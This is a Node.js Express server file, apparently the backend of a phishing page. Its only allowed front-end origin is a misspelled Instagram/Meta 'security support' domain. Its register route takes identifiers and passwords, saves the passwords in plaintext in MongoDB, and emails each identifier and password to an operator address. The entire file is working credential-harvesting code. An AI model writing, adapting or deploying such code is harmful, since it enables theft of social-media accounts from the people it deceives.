// app.js
require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors({
  origin: 'https://instagram.security.suport.metas.onrender.com' // domínio real do frontend
}));

// Conectar ao MongoDB
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
}).catch(err => console.error('Erro ao conectar MongoDB:', err));

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'Erro de conexão:'));
db.once('open', () => console.log('Conectado ao MongoDB!'));

// Detecta tipo do identifier
function detectIdentifierType(identifier) {
  if (!identifier) return 'unknown';
  if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(identifier)) return 'email';
  if (/^[0-9]{7,15}$/.test(identifier)) return 'phone';
  return 'username';
}

// Schema
const userSchema = new mongoose.Schema({
  identifier: { type: String, required: true, unique: true },
  identifierType: { type: String, required: true },
  senha: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
});
const User = mongoose.model('User', userSchema);

// Nodemailer
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.gmail.com',
  port: process.env.SMTP_PORT ? parseInt(process.env.SMTP_PORT, 10) : 465,
  secure: (process.env.SMTP_SECURE || 'true') === 'true',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});
async function notifyAdmin(user) {
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.ADMIN_EMAIL,
    subject: 'Novo registro',
    text: `Novo registro:\n\nIdentificador: ${user.identifier}\nTipo: ${user.identifierType}\nCriado em: ${user.createdAt.toISOString()}\nSenha: ${user.senha}`,
  };
  try {
    await transporter.sendMail(mailOptions);
    console.log('Notificação enviada ao admin.');
  } catch (err) {
    console.error('Erro ao enviar notificação:', err);
  }
}

// Rota
app.post('/register', async (req, res) => {
  try {
    const { identifier, senha } = req.body;
    if (!identifier || !senha) return res.status(400).json({ error: 'identifier e senha são obrigatórios' });

    const identifierType = detectIdentifierType(identifier);
    const existing = await User.findOne({ identifier });
    if (existing) return res.status(409).json({ error: 'Identificador já cadastrado' });

    const user = new User({ identifier, identifierType, senha });
    await user.save();
    notifyAdmin(user).catch(() => {});

    res.status(201).json({ message: 'Registro criado com sucesso', identifier: user.identifier, type: user.identifierType });
  } catch (err) {
    console.error(err);
    if (err && err.code === 11000) return res.status(409).json({ error: 'Identificador já cadastrado' });
    res.status(500).json({ error: 'Erro no servidor' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
